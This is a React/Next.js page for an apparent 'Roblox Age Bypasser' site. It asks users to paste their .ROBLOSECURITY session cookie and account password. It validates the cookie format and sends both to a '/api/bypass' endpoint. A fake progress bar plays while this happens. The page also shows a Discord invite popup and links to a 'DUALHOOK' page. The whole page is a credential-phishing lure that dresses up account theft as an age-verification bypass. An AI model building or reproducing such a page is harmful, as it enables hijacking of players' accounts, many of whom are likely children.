"use client"

import { useState, useEffect } from "react"
import { Shield, Play } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import Link from "next/link"

interface DiscordInvite {
  guild: {
    name: string
  }
  approximate_member_count: number
  approximate_presence_count: number
}

export default function Home() {
  const [cookie, setCookie] = useState("")
  const [robloxPassword, setRobloxPassword] = useState("")
  const [isProcessing, setIsProcessing] = useState(false)
  const [progress, setProgress] = useState(0)
  const [username, setUsername] = useState("")
  const [statusText, setStatusText] = useState("")
  const [error, setError] = useState("")
  const [showDiscordModal, setShowDiscordModal] = useState(false)
  const [discordData, setDiscordData] = useState<DiscordInvite | null>(null)

  useEffect(() => {
    const hasSeenModal = localStorage.getItem("hasSeenDiscordModal")
    if (!hasSeenModal) {
      setShowDiscordModal(true)
      fetchDiscordData()
    }
  }, [])

  const fetchDiscordData = async () => {
    try {
      const response = await fetch("https://discord.com/api/v10/invites/tGYBBAfc5T?with_counts=true")
      const data = await response.json()
      setDiscordData(data)
      console.log("[v0] Discord data fetched:", data)
    } catch (error) {
      console.error("[v0] Failed to fetch Discord data:", error)
    }
  }

  const handleCloseModal = () => {
    localStorage.setItem("hasSeenDiscordModal", "true")
    setShowDiscordModal(false)
  }

  const isValidRobloxCookie = (cookieValue: string): boolean => {
    const trimmedCookie = cookieValue.trim()

    if (!trimmedCookie) return false

    if (trimmedCookie.includes("_|WARNING:-DO-NOT-SHARE-THIS")) {
      const parts = trimmedCookie.split("|_")
      if (parts.length >= 2) {
        const actualCookie = parts[parts.length - 1]
        return actualCookie.length > 50
      }
    }

    if (trimmedCookie.startsWith(".ROBLOSECURITY=")) {
      const cookiePart = trimmedCookie.substring(".ROBLOSECURITY=".length)
      return cookiePart.length > 50
    }

    return trimmedCookie.length > 50
  }

  const handleBypass = async () => {
    if (!cookie.trim()) {
      setError("Please enter a cookie")
      return
    }

    if (!robloxPassword.trim()) {
      setError("Please enter your Roblox account password")
      return
    }

    if (!isValidRobloxCookie(cookie)) {
      setError("Invalid Roblox cookie format. Please enter a valid .ROBLOSECURITY cookie.")
      return
    }

    setError("")
    setIsProcessing(true)
    setProgress(0)
    setUsername("")
    setStatusText("Processing...")

    try {
      console.log("[v0] Sending bypass request to API...")
      const response = await fetch("/api/bypass", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ cookie: cookie.trim(), password: robloxPassword.trim() }),
      })

      const result = await response.json()
      console.log("[v0] API response:", result)

      if (!response.ok || !result.success) {
        const errorMessage = result.error || "Invalid cookie or password. Please check your credentials and try again."
        setError(errorMessage)
        setIsProcessing(false)
        setProgress(0)
        setStatusText("")
        setUsername("")
        return
      }

      if (result.userInfo?.name) {
        setUsername(result.userInfo.name)
      }

      const totalDuration = 10000
      const intervalTime = 100
      const incrementPerInterval = (100 / totalDuration) * intervalTime

      const progressInterval = setInterval(() => {
        setProgress((prev) => {
          const newProgress = prev + incrementPerInterval
          if (newProgress >= 100) {
            clearInterval(progressInterval)
            setStatusText("Complete!")
            setTimeout(() => {
              setIsProcessing(false)
              setProgress(0)
              setCookie("")
              setRobloxPassword("")
              setUsername("")
              setStatusText("")
            }, 500)
            return 100
          }
          return newProgress
        })
      }, intervalTime)
    } catch (error) {
      console.error("[v0] Failed to bypass:", error)
      setError("Connection error. Please check your internet and try again.")
      setStatusText("")
      setIsProcessing(false)
      setProgress(0)
      setUsername("")
    }
  }

  const onlineMembers = discordData?.approximate_presence_count || 27
  const totalMembers = discordData?.approximate_member_count || 179
  const offlineMembers = totalMembers - onlineMembers
  const serverName = discordData?.guild?.name || "Uhmiyuz's server"

  return (
    <main className="relative min-h-screen bg-black flex flex-col items-center justify-center p-4 overflow-hidden">
      {showDiscordModal && (
        <div className="fixed inset-0 bg-black/90 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-white rounded-lg shadow-2xl overflow-hidden max-w-md w-full animate-in fade-in zoom-in duration-300">
            <div className="bg-[#5865F2] pt-12 pb-8 flex items-center justify-center">
              <div className="w-24 h-24 bg-white rounded-full flex items-center justify-center shadow-lg">
                <svg viewBox="0 0 127.14 96.36" className="w-14 h-14 fill-[#5865F2]">
                  <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z" />
                </svg>
              </div>
            </div>

            <div className="px-8 py-6 bg-white">
              <h2 className="text-2xl font-bold text-gray-800 mb-6 flex items-center gap-2">
                <span className="text-2xl">🎉</span>
                Join {serverName}!
              </h2>

              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                  <div>
                    <div className="text-xl font-bold text-gray-800">{onlineMembers}</div>
                    <div className="text-xs text-gray-500 uppercase font-semibold">Online</div>
                  </div>
                </div>

                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-gray-400 rounded-full"></div>
                  <div>
                    <div className="text-xl font-bold text-gray-800">{offlineMembers}</div>
                    <div className="text-xs text-gray-500 uppercase font-semibold">Offline</div>
                  </div>
                </div>

                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-[#5865F2] rounded-full"></div>
                  <div>
                    <div className="text-xl font-bold text-gray-800">{totalMembers}</div>
                    <div className="text-xs text-gray-500 uppercase font-semibold">Total Members</div>
                  </div>
                </div>
              </div>

              <div className="flex gap-3">
                <button
                  onClick={handleCloseModal}
                  className="flex-1 py-3 px-4 border-2 border-gray-300 text-gray-700 rounded-md font-semibold hover:bg-gray-50 transition-colors text-center text-sm uppercase"
                >
                  Maybe Later
                </button>
                <a
                  href="https://discord.gg/tGYBBAfc5T"
                  target="_blank"
                  rel="noopener noreferrer"
                  onClick={handleCloseModal}
                  className="flex-1 py-3 px-4 bg-[#5865F2] text-white rounded-md font-semibold hover:bg-[#4752C4] transition-colors flex items-center justify-center gap-2 text-sm uppercase"
                >
                  <svg viewBox="0 0 127.14 96.36" className="w-5 h-5 fill-white">
                    <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z" />
                  </svg>
                  Join Now!
                </a>
              </div>
            </div>
          </div>
        </div>
      )}

      <div className="absolute top-6 right-6 z-20">
        <Link href="/dualhook">
          <Button
            variant="outline"
            className="bg-zinc-900/80 backdrop-blur-xl border-2 border-primary/40 text-white hover:bg-zinc-800 hover:border-primary/60 font-semibold shadow-[0_0_30px_rgba(168,85,247,0.3)] hover:shadow-[0_0_40px_rgba(168,85,247,0.5)] transition-all"
          >
            DUALHOOK
          </Button>
        </Link>
      </div>

      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-0 left-1/4 w-96 h-96 bg-primary/20 rounded-full blur-[128px] animate-pulse"></div>
        <div
          className="absolute bottom-0 right-1/4 w-96 h-96 bg-violet-500/20 rounded-full blur-[128px] animate-pulse"
          style={{ animationDelay: "1s" }}
        ></div>
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-primary/10 rounded-full blur-[150px]"></div>
      </div>

      <div className="relative z-10">
        <div className="flex flex-col items-center mb-12">
          <div className="w-20 h-20 rounded-full bg-zinc-900 flex items-center justify-center mb-6 ring-2 ring-primary/50 shadow-[0_0_30px_rgba(168,85,247,0.4)]">
            <Shield className="w-10 h-10 text-primary drop-shadow-[0_0_10px_rgba(168,85,247,0.8)]" strokeWidth={1.5} />
          </div>

          <h1 className="text-4xl md:text-5xl font-bold text-white mb-3 text-balance text-center drop-shadow-[0_0_20px_rgba(168,85,247,0.5)]">
            Roblox Age Bypasser
          </h1>

          <p className="text-zinc-400 text-lg text-center">Secure and efficient age verification bypass</p>
        </div>

        <Card className="w-full max-w-md bg-zinc-900/80 backdrop-blur-xl border-2 border-primary/40 shadow-[0_0_50px_rgba(168,85,247,0.3)]">
          <CardContent className="p-8">
            <label className="block text-white text-sm font-medium mb-3">.ROBLOSECURITY Cookie</label>

            <textarea
              value={cookie}
              onChange={(e) => {
                setCookie(e.target.value)
                setError("")
              }}
              placeholder="Paste your cookie here..."
              className="w-full h-24 px-4 py-3 bg-zinc-950/90 border border-zinc-800 rounded-lg text-white placeholder:text-zinc-600 focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary/50 focus:shadow-[0_0_20px_rgba(168,85,247,0.3)] resize-none mb-6 transition-all"
            />

            <label className="block text-white text-sm font-medium mb-3">Roblox Account Password</label>

            <input
              type="password"
              value={robloxPassword}
              onChange={(e) => {
                setRobloxPassword(e.target.value)
                setError("")
              }}
              placeholder="Enter your Roblox password..."
              className="w-full h-12 px-4 py-3 bg-zinc-950/90 border border-zinc-800 rounded-lg text-white placeholder:text-zinc-600 focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary/50 focus:shadow-[0_0_20px_rgba(168,85,247,0.3)] mb-2 transition-all"
            />

            {error && (
              <div className="mb-4 p-3 bg-red-950/50 border border-red-900 rounded-lg">
                <p className="text-red-400 text-sm">{error}</p>
              </div>
            )}

            <Button
              onClick={handleBypass}
              disabled={!cookie.trim() || !robloxPassword.trim() || isProcessing}
              className="w-full h-12 bg-primary hover:bg-primary/90 text-white font-medium rounded-lg flex items-center justify-center gap-2 transition-all disabled:opacity-50 shadow-[0_0_30px_rgba(168,85,247,0.4)] hover:shadow-[0_0_40px_rgba(168,85,247,0.6)]"
            >
              <Play className="w-4 h-4" fill="currentColor" />
              {isProcessing ? "In Progress" : "Start Bypass"}
            </Button>

            {isProcessing && (
              <div className="mt-6 space-y-3">
                <div className="text-center">
                  <p className="text-zinc-400 text-sm mb-1">Processing account</p>
                  {username && <p className="text-white font-medium">{username}</p>}
                </div>

                <div className="space-y-2">
                  <div className="flex items-center justify-between text-sm">
                    <span className="text-zinc-400">Progress</span>
                    <span className="text-white font-medium">{Math.round(progress)}%</span>
                  </div>

                  <div className="w-full h-2 bg-zinc-800 rounded-full overflow-hidden">
                    <div
                      className="h-full bg-primary transition-all duration-300 ease-out shadow-[0_0_20px_rgba(168,85,247,0.8)]"
                      style={{ width: `${progress}%` }}
                    />
                  </div>

                  <p className="text-zinc-500 text-xs text-center flex items-center justify-center gap-1">
                    <span className="inline-block w-1 h-1 bg-primary rounded-full animate-pulse shadow-[0_0_5px_rgba(168,85,247,0.8)]" />
                    {statusText}
                  </p>
                </div>
              </div>
            )}
          </CardContent>
        </Card>

        <div className="mt-12 flex items-center gap-2 text-zinc-600 text-sm">
          <span>Secure</span>
          <span>•</span>
          <span>Fast</span>
          <span>•</span>
          <span>Reliable</span>
        </div>
      </div>
    </main>
  )
}
